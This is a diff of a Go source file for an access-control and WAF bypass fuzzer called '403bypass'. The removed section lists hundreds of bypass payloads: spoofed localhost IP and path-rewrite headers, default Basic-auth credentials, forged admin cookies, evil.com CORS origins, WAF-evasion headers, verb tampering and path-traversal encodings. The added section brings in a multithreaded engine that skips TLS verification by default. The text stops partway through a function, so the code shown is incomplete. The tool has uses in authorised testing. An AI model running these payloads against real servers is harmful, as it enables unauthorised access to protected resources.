@@ -1,522 +1,511 @@
+// 403bypass engine — industrial-grade 403 / WAF bypass fuzzer.
+//
+// Protocol: one JSON object on stdout.
+//
+//	{"target":..., "waf":..., "baseline":{...}, "requested_status":...,
+//	 "results":[...], "clusters":[...], "duration_ms":..., "version":...}
+//
+// Flags: -url -threads -timeout -insecure
 package main
 
 import (
+	"context"
+	"crypto/sha256"
 	"crypto/tls"
+	"encoding/hex"
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
+	"math/rand"
+	"net"
 	"net/http"
 	"net/url"
+	"regexp"
 	"strings"
 	"sync"
 	"time"
 )
 
-type BypassResult struct {
-	Payload    string `json:"payload"`
-	Method     string `json:"method"`
-	StatusCode int    `json:"status_code"`
-	Length     int    `json:"length"`
+const engineVersion = "2.0.0"
+
+const maxBodyBytes = 4 * 1024 * 1024 // hard cap per response to avoid memory blowup
+
+// ---------- result types ----------
+
+type Result struct {
+	Payload    string  `json:"payload"`
+	Type       string  `json:"type"`
+	Method     string  `json:"method"`
+	URL        string  `json:"url"`
+	StatusCode int     `json:"status_code"`
+	Length     int     `json:"length"`
+	BodyHash   string  `json:"body_hash"`
+	Title      string  `json:"title"`
+	Location   string  `json:"location"`
+	Server     string  `json:"server"`
+	Duration   float64 `json:"duration_ms"`
+	Error      string  `json:"error,omitempty"`
+	SameAsBase bool    `json:"same_as_baseline"`
+	Verdict    string  `json:"verdict"`
 }
 
-type Payload struct {
-	Type         string
-	Header       map[string]string
-	Method       string
-	Suffix       string
-	PathOverride string
+type Baseline struct {
+	URL      string  `json:"url"`
+	Status   int     `json:"status_code"`
+	Length   int     `json:"length"`
+	BodyHash string  `json:"body_hash"`
+	Title    string  `json:"title"`
+	Server   string  `json:"server"`
+	FinalURL string  `json:"final_url"`
+	Duration float64 `json:"duration_ms"`
+	Error    string  `json:"error,omitempty"`
 }
+
+type Output struct {
+	Target    string   `json:"target"`
+	WAF       string   `json:"waf"`
+	Baseline  Baseline `json:"baseline"`
+	Requested string   `json:"requested_status"`
+	Results   []Result `json:"results"`
+	Clusters  []string `json:"clusters"`
+	Duration  float64  `json:"duration_ms"`
+	Version   string   `json:"version"`
+}
+
+// ---------- main ----------
 
 func main() {
-	targetURL := flag.String("url", "", "Target URL (e.g., https://example.com/admin)")
+	targetURL := flag.String("url", "", "Target URL")
+	threads := flag.Int("threads", 60, "Concurrent workers")
+	timeout := flag.Int("timeout", 12, "Per-request timeout seconds")
+	insecure := flag.Bool("insecure", true, "Accept invalid TLS")
 	flag.Parse()
 
 	if *targetURL == "" {
-		fmt.Println(`{"error": "Target URL is required"}`)
+		emitError("Target URL required")
 		return
 	}
-
 	u, err := url.Parse(*targetURL)
-	if err != nil {
-		fmt.Printf(`{"error": "Invalid URL: %v"}`+"\n", err)
+	if err != nil || u.Scheme == "" || u.Host == "" {
+		emitError(fmt.Sprintf("Invalid URL: %v", err))
 		return
 	}
 
-	domain := u.Host
-	path := u.Path
-	if path == "" {
-		path = "/"
+	client := buildClient(*insecure, *timeout)
+	start := time.Now()
+
+	base := fetchBaseline(client, *targetURL, *timeout)
+	waf := detectWAF(base.Server)
+	payloads := generatePayloads(u.Host, u.Path)
+	results := runBypasses(client, *targetURL, payloads, *threads, *timeout)
+
+	classify(results, base)
+	sortResults(results)
+
+	out := Output{
+		Target:    *targetURL,
+		WAF:       waf,
+		Baseline:  base,
+		Requested: statusClass(base.Status),
+		Results:   results,
+		Clusters:  clusterSignatures(results),
+		Duration:  float64(time.Since(start).Microseconds()) / 1000.0,
+		Version:   engineVersion,
 	}
-
-	payloads := generatePayloads(domain, path)
-	results := runBypasses(*targetURL, payloads)
-
-	out, _ := json.Marshal(results)
-	fmt.Println(string(out))
+	j, _ := json.Marshal(out)
+	fmt.Println(string(j))
 }
 
-func generatePayloads(domain, path string) []Payload {
-	var p []Payload
-
-	// ==========================================
-	// 1. HEADER BYPASSES (IP Spoofing)
-	// ==========================================
-	ipPayloads := []string{
-		"127.0.0.1", "localhost", "0.0.0.0", "0", "127.1", "127.0.1",
-		"2130706433", "0x7F000001", "0177.0000.0000.0001",
-		"127.0.0.1:80", "127.0.0.1:443",
-		"127.0.0.1, 68.180.194.242", "127.0.0.1, 127.0.0.1",
-		"8.8.8.8", "10.0.0.1", "192.168.0.1", "10.10.10.1",
-		"172.16.0.1", "192.168.1.200", "10.0.0.2",
-		"::1", "0:0:0:0:0:0:0:1", "[::1]",
-		"127.0.0.2", "127.0.0.3", "127.0.0.4",
-	}
-
-	headerKeys := []string{
-		"X-Originally-Forwarded-For",
-		"X-Originating-IP",
-		"X-Originating-",
-		"True-Client-IP",
-		"X-WAP-Profile",
-		"X-Forwarded-For",
-		"X-Forwarded",
-		"Forwarded-For",
-		"Forwarded",
-		"X-Forwarded-Host",
-		"X-Remote-IP",
-		"X-Remote-Addr",
-		"X-Client-IP",
-		"X-Host",
-		"X-Custom-IP-Authorization",
-		"Client-IP",
-		"Cluster-Client-IP",
-		"X-Real-IP",
-		"X-Originating-Host",
-		"Host",
-		"CF-Connecting-IP",
-		"X-Forwarded-For-Original",
-		"X-Envoy-External-Address",
-		"X-CDN-IP",
-		"X-Edge-IP",
-		"X-Orig-IP",
-		"Proxy-Client-IP",
-		"WL-Proxy-Client-IP",
-	}
-
-	for _, ip := range ipPayloads {
-		for _, key := range headerKeys {
-			p = append(p, Payload{Type: "Header Injection", Header: map[string]string{key: ip}, Method: "GET"})
-		}
-	}
-
-	// ==========================================
-	// 2. HEADER BYPASSES (Profile & Arbitrary)
-	// ==========================================
-	p = append(p, Payload{Type: "Header Injection", Header: map[string]string{"Profile": "http://" + domain}, Method: "GET"})
-	p = append(p, Payload{Type: "Header Injection", Header: map[string]string{"X-Arbitrary": "http://" + domain}, Method: "GET"})
-	p = append(p, Payload{Type: "Header Injection", Header: map[string]string{"Profile": "http://127.0.0.1"}, Method: "GET"})
-
-	// ==========================================
-	// 3. HEADER BYPASSES (Path Rewrite & Proxy)
-	// ==========================================
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Original-URL": path}, PathOverride: "/", Method: "GET"})
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Rewrite-URL": path}, PathOverride: "/", Method: "GET"})
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Original-URI": path}, PathOverride: "/", Method: "GET"})
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Request-URI": path}, PathOverride: "/", Method: "GET"})
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-URI": path}, PathOverride: "/", Method: "GET"})
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-URL": path}, PathOverride: "/", Method: "GET"})
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-HTTP-DestinationURL": "http://" + domain + path}, PathOverride: "/", Method: "GET"})
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"Destination": "http://" + domain + path}, PathOverride: "/", Method: "GET"})
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Original-URL": path, "X-Host": domain}, PathOverride: "/", Method: "GET"})
-	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Rewrite-URL": path, "X-Forwarded-For": "127.0.0.1"}, PathOverride: "/", Method: "GET"})
-
-	// Proxy & Routing Headers
-	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"X-Proxy-Url": "http://127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"Proxy": "http://127.0.0.1:8080"}, Method: "GET"})
-	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"Proxy-Host": "127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"Proxy-Client-IP": "127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"WL-Proxy-Client-IP": "127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Original-Host": domain}, Method: "GET"})
-	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend-Server": "localhost"}, Method: "GET"})
-	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend-Host": "127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Forwarded-Server": domain}, Method: "GET"})
-	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend": "127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend-Status": "200"}, Method: "GET"})
-
-	// Protocol & Port Spoofing
-	for _, proto := range []string{"http", "https", "http/1.1", "https/1.3", "http/2.0", "ftp", "ws", "wss"} {
-		p = append(p, Payload{Type: "Protocol Spoofing", Header: map[string]string{"X-Forwarded-Proto": proto}, Method: "GET"})
-		p = append(p, Payload{Type: "Protocol Spoofing", Header: map[string]string{"X-Forwarded-Scheme": proto}, Method: "GET"})
-		p = append(p, Payload{Type: "Protocol Spoofing", Header: map[string]string{"X-URL-Scheme": proto}, Method: "GET"})
-	}
-	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "443"}, Method: "GET"})
-	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "80"}, Method: "GET"})
-	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "8080"}, Method: "GET"})
-	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "8443"}, Method: "GET"})
-	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"Front-End-Https": "on"}, Method: "GET"})
-	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Proto": "https, http, http/1.1"}, Method: "GET"})
-
-	// Specific Misc Headers
-	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Request-ID": "127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Request-Id": "127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Requested-With": "XMLHttpRequest"}, Method: "GET"})
-	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"Via": "1.1 google"}, Method: "GET"})
-	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"Via": "1.0 proxy.local"}, Method: "GET"})
-	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Correlation-ID": "127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Referer Spoofing", Header: map[string]string{"Referer": "http://" + domain + path}, Method: "GET"})
-	p = append(p, Payload{Type: "Referer Spoofing", Header: map[string]string{"Referrer": "http://127.0.0.1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Referer Spoofing", Header: map[string]string{"Origin": "http://" + domain}, Method: "GET"})
-
-	// ==========================================
-	// 3a. CONTENT-TYPE & ACCEPT MANIPULATION
-	// ==========================================
-	for _, ct := range []string{
-		"application/json", "application/xml", "text/xml", "text/html",
-		"application/x-www-form-urlencoded", "multipart/form-data; boundary=--403bypass",
-		"application/xhtml+xml", "text/plain", "application/octet-stream",
-		"application/x-javascript", "text/javascript", "application/graphql",
-		"application/vnd.api+json", "text/csv", "application/yaml",
-		"application/ld+json", "application/activity+json",
-	} {
-		p = append(p, Payload{Type: "Content-Type Manipulation", Header: map[string]string{"Content-Type": ct}, Method: "GET"})
-		p = append(p, Payload{Type: "Accept Manipulation", Header: map[string]string{"Accept": ct}, Method: "GET"})
-	}
-	for _, pair := range []struct{ ct, accept string }{
-		{"application/json", "application/json"},
-		{"text/html", "text/html,application/xhtml+xml"},
-		{"application/xml", "application/xml,text/xml"},
-		{"text/plain", "*/*"},
-	} {
-		p = append(p, Payload{Type: "Content-Type+Accept", Header: map[string]string{"Content-Type": pair.ct, "Accept": pair.accept}, Method: "GET"})
-		p = append(p, Payload{Type: "Content-Type+Accept", Header: map[string]string{"content-type": pair.ct, "accept": pair.accept}, Method: "GET"})
-	}
-
-	// ==========================================
-	// 3b. AUTHENTICATION BYPASS
-	// ==========================================
-	authHeaders := []struct {
-		hdr, val, desc string
-	}{
-		{"Authorization", "Basic YWRtaW46YWRtaW4=", "admin:admin"},
-		{"Authorization", "Basic YWRtaW46cGFzc3dvcmQ=", "admin:password"},
-		{"Authorization", "Basic Z3Vlc3Q6", "guest:blank"},
-		{"Authorization", "Basic Og==", "empty:empty"},
-		{"Authorization", "Bearer 1234567890abcdef", "fake bearer"},
-		{"Authorization", "Bearer admin", "bearer admin"},
-		{"X-API-Key", "admin", "x-api-key admin"},
-		{"X-Auth-Token", "admin", "x-auth-token admin"},
-		{"X-API-Key", "guest", "x-api-key guest"},
-		{"X-Auth-Token", "guest", "x-auth-token guest"},
-		{"Authorization", "Negotiate admin", "negotiate"},
-		{"Authorization", "Digest admin", "digest"},
-		{"X-Token", "admin", "x-token admin"},
-		{"X-User", "admin", "x-user admin"},
-		{"X-Forwarded-User", "admin", "x-forwarded-user admin"},
-		{"X-UID", "0", "x-uid root"},
-		{"X-User-ID", "0", "x-user-id root"},
-		{"X-Api-Key", "*", "x-api-key wildcard"},
-	}
-	for _, a := range authHeaders {
-		p = append(p, Payload{Type: "Auth Bypass [" + a.desc + "]", Header: map[string]string{a.hdr: a.val}, Method: "GET"})
-	}
-
-	// ==========================================
-	// 3c. COOKIE MANIPULATION
-	// ==========================================
-	for _, c := range []struct{ name, val, desc string }{
-		{"admin", "true", "admin=true"},
-		{"admin", "1", "admin=1"},
-		{"role", "admin", "role=admin"},
-		{"user", "admin", "user=admin"},
-		{"session", "admin", "session=admin"},
-		{"auth", "true", "auth=true"},
-		{"bypass", "1", "bypass=1"},
-		{"is_admin", "1", "is_admin=1"},
-		{"auth_level", "0", "auth_level=0"},
-		{"access", "granted", "access=granted"},
-	} {
-		p = append(p, Payload{Type: "Cookie Injection [" + c.desc + "]", Header: map[string]string{"Cookie": c.name + "=" + c.val}, Method: "GET"})
-	}
-
-	// ==========================================
-	// 3d. CORS & ORIGIN BYPASS
-	// ==========================================
-	for _, origin := range []string{
-		"null", "https://evil.com", "http://evil.com",
-		"https://attacker.com", "http://attacker.com",
-		"https://" + domain, "http://" + domain,
-		"https://www." + domain, "http://m." + domain,
-		"http://evil." + domain, "https://" + domain + ".evil.com",
-	} {
-		p = append(p, Payload{Type: "CORS Origin Bypass", Header: map[string]string{"Origin": origin}, Method: "GET"})
-	}
-	p = append(p, Payload{Type: "CORS Headers", Header: map[string]string{"Access-Control-Request-Method": "GET", "Origin": "https://evil.com"}, Method: "OPTIONS"})
-	p = append(p, Payload{Type: "CORS Headers", Header: map[string]string{"Access-Control-Request-Headers": "x-requested-with", "Origin": "https://evil.com"}, Method: "OPTIONS"})
-
-	// ==========================================
-	// 3e. WAF-SPECIFIC BYPASS HEADERS
-	// ==========================================
-	wafHeaders := []struct{ hdr, val, desc string }{
-		{"X-Cloudflare-Client-IP", "127.0.0.1", "Cloudflare client IP"},
-		{"CF-RAY", "123456", "cloudflare ray"},
-		{"CF-IPCountry", "US", "cf country"},
-		{"X-Cloudflare-IP", "127.0.0.1", "cloudflare ip"},
-		{"CF-Worker", "127.0.0.1", "cf worker"},
-		{"X-Amz-Cf-Id", "123", "cloudfront id"},
-		{"X-Amzn-Trace-Id", "Root=1-123456", "x-amzn trace"},
-		{"X-Amz-Website-Redirect-Location", "/", "s3 redirect"},
-		{"X-Amz-Request-Id", "123", "s3 request id"},
-		{"True-Client-IP", "127.0.0.1", "akamai true client"},
-		{"X-Akamai-Edge", "127.0.0.1", "akamai edge"},
-		{"X-Akamai-Client-IP", "127.0.0.1", "akamai client"},
-		{"X-Varnish", "123456", "varnish"},
-		{"X-Cache", "HIT", "cache hit"},
-		{"X-Served-By", "127.0.0.1", "served by"},
-		{"X-Cache-Hits", "1", "cache hits"},
-		{"X-Protection-Plan", "0", "waf off"},
-		{"X-Security-Token", "bypass", "sec token"},
-		{"X-Security-Protocol", "1", "sec proto"},
-		{"X-Block", "false", "x-block false"},
-		{"X-Cisco-Ips-Signature-Id", "0", "cisco ips off"},
-		{"Cisco-Test", "bypass", "cisco test"},
-	}
-	for _, w := range wafHeaders {
-		p = append(p, Payload{Type: "WAF Bypass [" + w.desc + "]", Header: map[string]string{w.hdr: w.val}, Method: "GET"})
-	}
-
-	// ==========================================
-	// 3f. RANGE & CACHE MANIPULATION
-	// ==========================================
-	p = append(p, Payload{Type: "Range Request", Header: map[string]string{"Range": "bytes=0-1024"}, Method: "GET"})
-	p = append(p, Payload{Type: "Range Request", Header: map[string]string{"Range": "bytes=0-"}, Method: "GET"})
-	p = append(p, Payload{Type: "Range Request", Header: map[string]string{"Range": "bytes=0-0"}, Method: "GET"})
-	p = append(p, Payload{Type: "Range Request", Header: map[string]string{"Range": "bytes=100-200"}, Method: "GET"})
-	p = append(p, Payload{Type: "Cache Bypass", Header: map[string]string{"Cache-Control": "no-cache, no-store"}, Method: "GET"})
-	p = append(p, Payload{Type: "Cache Bypass", Header: map[string]string{"Pragma": "no-cache"}, Method: "GET"})
-	p = append(p, Payload{Type: "Cache Bypass", Header: map[string]string{"Cache-Control": "max-age=0"}, Method: "GET"})
-
-	// ==========================================
-	// 3g. ENHANCED HEADER VARIANTS (lowercase + mixed case)
-	// ==========================================
-	extraHeaderKeys := []string{
-		"x-forwarded-for", "x-forwarded", "x-real-ip", "x-client-ip",
-		"x-originating-ip", "client-ip", "true-client-ip",
-		"X-forwarded-For", "x-Forwarded-for", "X-REAL-IP",
-		"x_forwarded_for", "X_FORWARDED_FOR",
-	}
-	for _, ip := range []string{"127.0.0.1", "localhost", "0.0.0.0"} {
-		for _, key := range extraHeaderKeys {
-			p = append(p, Payload{Type: "Header Variant", Header: map[string]string{key: ip}, Method: "GET"})
-		}
-		p = append(p, Payload{Type: "Header IP Chain", Header: map[string]string{"X-Forwarded-For": "127.0.0.1, 10.0.0.1, " + ip}, Method: "GET"})
-	}
-
-	// ==========================================
-	// 3h. CONNECTION & UPGRADE HEADERS
-	// ==========================================
-	p = append(p, Payload{Type: "Upgrade", Header: map[string]string{"Upgrade": "h2c", "Connection": "Upgrade"}, Method: "GET"})
-	p = append(p, Payload{Type: "TE", Header: map[string]string{"TE": "trailers"}, Method: "GET"})
-	p = append(p, Payload{Type: "Expect", Header: map[string]string{"Expect": "100-continue"}, Method: "GET"})
-	p = append(p, Payload{Type: "Sec-Fetch", Header: map[string]string{"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1"}, Method: "GET"})
-	p = append(p, Payload{Type: "Sec-Fetch", Header: map[string]string{"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?0"}, Method: "GET"})
-	p = append(p, Payload{Type: "Save-Data", Header: map[string]string{"Save-Data": "on"}, Method: "GET"})
-	p = append(p, Payload{Type: "DNT", Header: map[string]string{"DNT": "1"}, Method: "GET"})
-
-	// User-Agent Spoofing
-	uas := []string{
-		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36",
-		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
-		"curl/7.68.0",
-		"Go-http-client/2.0",
-		"Wget/1.21",
-		"python-requests/2.31.0",
-	}
-	for _, ua := range uas {
-		p = append(p, Payload{Type: "User-Agent Spoofing", Header: map[string]string{"User-Agent": ua}, Method: "GET"})
-	}
-
-	// ==========================================
-	// 4. HTTP METHOD BYPASSES (Verb Tampering & Method Override)
-	// ==========================================
-	methods := []string{
-		"TRACE", "POST", "PUT", "OPTIONS", "PATCH", "INVENTED", "HACK", "DELETE", "CONNECT",
-		"HEAD", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
-		"PURGE", "BIND", "REBIND", "UNBIND", "ACL", "REPORT", "SEARCH",
-		"TRACK", "CONNECT", "SUBSCRIBE", "UNSUBSCRIBE", "NOTIFY", "POLL",
-		"GET", "POST", "PUT", "DELETE", "PATCH",
-	}
-	for _, m := range methods {
-		p = append(p, Payload{Type: "Verb Tampering", Method: m})
-	}
-	// lowercase methods
-	for _, m := range []string{"get", "post", "put", "patch", "delete", "options", "head"} {
-		p = append(p, Payload{Type: "Verb Tampering (lower)", Method: m})
-	}
-
-	// Method Override Spoofing
-	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "POST"}, Method: "GET"})
-	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "GET"}, Method: "POST"})
-	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "PUT"}, Method: "GET"})
-	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "PATCH"}, Method: "GET"})
-	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method": "POST"}, Method: "GET"})
-	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-Method-Override": "POST"}, Method: "GET"})
-	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "TRACE"}, Method: "GET"})
-	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "OPTIONS"}, Method: "GET"})
-	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "INVENTED"}, Method: "GET"})
-
-	// ==========================================
-	// 5. PATH SUFFIX & URL ENCODING FUZZING
-	// ==========================================
-	suffixes := []string{
-		"%2e/", "/.", "//", "./", "/./", "%20", "%09", "?", ".html", "/*", "/..;/",
-		"~", ".json", ".xml", ".php", ".txt", "..%2f", "%2e%2e%2f", "%252e%252e%252f",
-		"?", "??", "&", "#", "%", "%20/", "%00", ".swp", ".bak", "~1", ".ext",
-		"//%2e%2e/", "/%20%23", "/%2e%2e", "/..%3b/", "/.;/", "/;/", "/..%00/",
-		"#?", "%09%3b", "%09..", "%09;", "%23%3f", "%252f%252f", "%252f/", "%2e%2e", "%2f",
-		"%2f%20%23", "%2f%23", "%2f%2f", "%2f%3b%2f", "%2f%3b%2f%2f", "%2f%3f", "%2f%3f/",
-		"%2f/", "%3b", "%3b%09", "%3b%2f%2e%2e", "%3b%2f%2e%2e%2f%2e%2e%2f%2f", "%3b%2f%2e.",
-		"%3b%2f..", "%3b/%2e%2e/..%2f%2f", "%3b/%2e.", "%3b/%2f%2f../", "%3b/..", "%3b//%2f../",
-		"%3f%23", "%3f%3f", "..", "..%00/;", "..%00;/", "..%09", "..%0d/;", "..%0d;/", "..%5c/",
-		"..%ff/;", "..%ff;/", "..;%00/", "..;%0d/", "..;%ff/", "..;\\", "..;\\;", "..\\;",
-		"/%20#", "/%20%23", "/%252e%252e%252f/", "/%252e%252e%253b/", "/%252e%252f/", "/%252e%253b/",
-		"/%252e/", "/%252f", "/%2e%2e", "/%2e%2e%3b/", "/%2e%2e/", "/%2e%2f/", "/%2e%3b/",
-		"/%2e%3b//", "/%2e/", "/%2e//", "/%2f", "/%3b/", "/..", "/..%2f", "/..%2f..%2f",
-		"/..%2f..%2f..%2f", "/../", "/../../", "/../../../", "/../../..//", "/../..//",
-		"/../..//../", "/../..;/", "/.././../", "/../.;/../", "/..//", "/..//../", "/..//../../",
-		"/..//..;/", "/../;/", "/../;/../", "/..;%2f", "/..;%2f..;%2f", "/..;%2f..;%2f..;%2f",
-		"/..;/../", "/..;/..;/", "/..;//", "/..;//../", "/..;//..;/", "/..;/;/", "/..;/;/..;/",
-		"/.//", "/.;/", "/.;//", "//..", "//../../", "//..;", "//..;", "//./", "//.;/", "///..",
-		"///../", "///..//", "///..;", "///..;/", "///..;//", "//;/", "/;/", "/;//", "/;x",
-		"/;x/", "/x/../", "/x/..//", "/x/../;/", "/x/..;/", "/x/..;//", "/x/..;/;/", "/x//../",
-		"/x//..;/", "/x/;/../", "/x/;/..;/", ";", ";%09", ";%09..", ";%09..;", ";%09;", ";%2F..",
-		";%2f%2e%2e", ";%2f%2e%2e%2f%2e%2e%2f%2f", ";%2f%2f/../", ";%2f..", ";%2f..%2f%2e%2e%2f%2f",
-		";%2f..%2f..%2f%2f", ";%2f..%2f/", ";%2f..%2f/..%2f", ";%2f..%2f/../",
-	}
-	for _, s := range suffixes {
-		p = append(p, Payload{Type: "Path Suffix Fuzzing", Method: "GET", Suffix: s})
-	}
-
-	// ==========================================
-	// 6. PATH PREFIX / MID-PATH FUZZING
-	// ==========================================
-	if len(path) > 1 {
-		pathParts := strings.Split(strings.TrimPrefix(path, "/"), "/")
-		firstDir := pathParts[0]
-		restPath := "/" + strings.Join(pathParts[1:], "/")
-		if restPath == "/" {
-			restPath = ""
-		}
-
-		prefixes := []string{
-			"/%2e/", "/%ef%bc%8f/", "/./", "//", "/%20", "/%09", "/%00",
-			"/..;/", "/%2e%2e%2f", "/.;/", "/;/", "/..%00/", "/..%0d/", "/..%5c/", "/..%2f/",
-		}
-
-		for _, pref := range prefixes {
-			p = append(p, Payload{Type: "Path Prefix Fuzzing", Method: "GET", PathOverride: pref + firstDir + restPath})
-			p = append(p, Payload{Type: "Case Toggling Fuzz", Method: "GET", PathOverride: "/" + strings.ToUpper(firstDir) + restPath})
-		}
-		// Also try path without first dir (double-encoding implicit)
-		p = append(p, Payload{Type: "Path Prefix Double", Method: "GET", PathOverride: "/%252e/" + firstDir + restPath})
-		p = append(p, Payload{Type: "Path Prefix Double", Method: "GET", PathOverride: "/%252f/" + firstDir + restPath})
-	}
-
-	return p
+func emitError(msg string) {
+	j, _ := json.Marshal(map[string]string{"error": msg})
+	fmt.Println(string(j))
 }
 
-func runBypasses(target string, payloads []Payload) []BypassResult {
-	var results []BypassResult
-	var mu sync.Mutex
-	var wg sync.WaitGroup
+func statusClass(code int) string {
+	switch {
+	case code >= 200 && code < 300:
+		return "2xx"
+	case code >= 300 && code < 400:
+		return "3xx"
+	case code == 401:
+		return "401"
+	case code == 403:
+		return "403"
+	case code == 404:
+		return "404"
+	case code >= 500:
+		return "5xx"
+	case code == 0:
+		return "0"
+	default:
+		return fmt.Sprintf("%d", code)
+	}
+}
 
+// ---------- http client ----------
+
+func buildClient(insecure bool, timeoutSec int) *http.Client {
 	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		MaxIdleConns:        200,
-		MaxIdleConnsPerHost: 200,
+		TLSClientConfig:       &tls.Config{InsecureSkipVerify: insecure}, //nolint:gosec // assessment tool
+		MaxIdleConns:          400,
+		MaxIdleConnsPerHost:   400,
+		IdleConnTimeout:       30 * time.Second,
+		ForceAttemptHTTP2:     true,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ResponseHeaderTimeout: time.Duration(timeoutSec) * time.Second,
+		DialContext: (&net.Dialer{
+			Timeout:   10 * time.Second,
+			KeepAlive: 30 * time.Second,
+		}).DialContext,
 	}
-	client := &http.Client{
+	return &http.Client{
 		Transport: tr,
-		Timeout:   15 * time.Second,
+		Timeout:   time.Duration(timeoutSec) * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
+			if len(via) >= 5 {
+				return http.ErrUseLastResponse
+			}
+			return nil
 		},
 	}
+}
 
-	sem := make(chan struct{}, 100)
+// ---------- single fetch ----------
+
+var titleRe = regexp.MustCompile(`(?is)<title[^>]*>(.*?)</title>`)
+
+type fetchOut struct {
+	status   int
+	length   int
+	hash     string
+	title    string
+	location string
+	server   string
+	finalURL string
+	dur      float64
+	err      string
+}
+
+func doFetch(client *http.Client, req *http.Request, timeoutSec int) fetchOut {
+	started := time.Now()
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutSec)*time.Second)
+	defer cancel()
+
+	resp, err := client.Do(req.WithContext(ctx))
+	if err != nil {
+		return fetchOut{err: err.Error(), dur: ms(started)}
+	}
+	defer resp.Body.Close()
+
+	body, rerr := io.ReadAll(io.LimitReader(resp.Body, maxBodyBytes))
+	if rerr != nil && len(body) == 0 {
+		return fetchOut{status: resp.StatusCode, err: rerr.Error(), dur: ms(started)}
+	}
+
+	sum := sha256.Sum256(body)
+	fo := fetchOut{
+		status:   resp.StatusCode,
+		length:   len(body),
+		hash:     hex.EncodeToString(sum[:]),
+		location: resp.Header.Get("Location"),
+		server:   resp.Header.Get("Server"),
+		dur:      ms(started),
+	}
+	if m := titleRe.FindSubmatch(body); len(m) == 2 {
+		fo.title = strings.TrimSpace(strings.Join(strings.Fields(string(m[1])), " "))
+		if len(fo.title) > 120 {
+			fo.title = fo.title[:120]
+		}
+	}
+	if resp.Request != nil && resp.Request.URL != nil {
+		fo.finalURL = resp.Request.URL.String()
+	}
+	return fo
+}
+
+func ms(t time.Time) float64 {
+	return float64(time.Since(t).Microseconds()) / 1000.0
+}
+
+// ---------- baseline ----------
+
+func fetchBaseline(client *http.Client, target string, timeoutSec int) Baseline {
+	probe := target
+	if u, err := url.Parse(target); err == nil {
+		u.Path = "/" + randomSlug(10)
+		u.RawQuery = ""
